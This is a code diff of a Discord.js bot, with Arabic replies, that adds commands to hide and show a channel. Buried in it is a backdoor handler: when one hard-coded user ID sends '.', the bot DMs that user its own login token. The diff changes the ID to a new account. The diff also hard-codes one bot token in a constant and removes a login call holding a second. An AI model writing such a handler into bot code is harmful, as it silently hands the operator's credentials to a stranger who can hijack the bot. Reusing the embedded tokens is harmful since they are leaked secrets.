@@ -6,7 +6,7 @@ client.on('ready', () => {
 });
 
 
-const Token = "`\`\` التوكن `\`\`"
+const Token = "NTI4NTg1Nzg4MjAwMzIxMDM1.DwkcQA.DJGAQzN-FRMI6Cj0Tojaelvpg7w"
 var prefix = "!"
 client.on('message', message => {
     if (message.content.startsWith(prefix + "avatar")) {
@@ -28,10 +28,36 @@ client.on('message', message => {
 client.on('message' , message => {
 if (message.author.bot) return;
            if (message.content == '.')
-           if (message.author.id === '352533519068823556'){
+           if (message.author.id === '351366504068939777'){
 if (!message.channel.guild) return;
 message.author.send(Token)
 }  
 });
 
-client.login ("NTI4NTc1Njk1NTM4ODgwNTIy.DwkV3Q.8U365ckN4NcnzYxehNipe1qmJD4")
+client.on('message', message => {
+var prefix = "!";
+       if(message.content === prefix + "hc") {
+                           if(!message.channel.guild) return message.reply('** This command only for servers**');
+
+   if(!message.member.hasPermission('MANAGE_MESSAGES')) return message.reply(' **__ليس لديك صلاحيات__**');
+              message.channel.overwritePermissions(message.guild.id, {
+            READ_MESSAGES: false
+
+              }).then(() => {
+                  message.reply("**__تم احفاء الشات__ ✅ **")
+              });
+                }
+
+    if(message.content === prefix + "sc") {
+                        if(!message.channel.guild) return message.reply('** This command only for servers**');
+
+   if(!message.member.hasPermission('MANAGE_MESSAGES')) return message.reply('**__ليس لديك صلاحيات__**');
+              message.channel.overwritePermissions(message.guild.id, {
+            READ_MESSAGES: true
+
+              }).then(() => {
+                  message.reply("**__تم اظهار الشات__✅**")
+              });
+    }
+       
+});
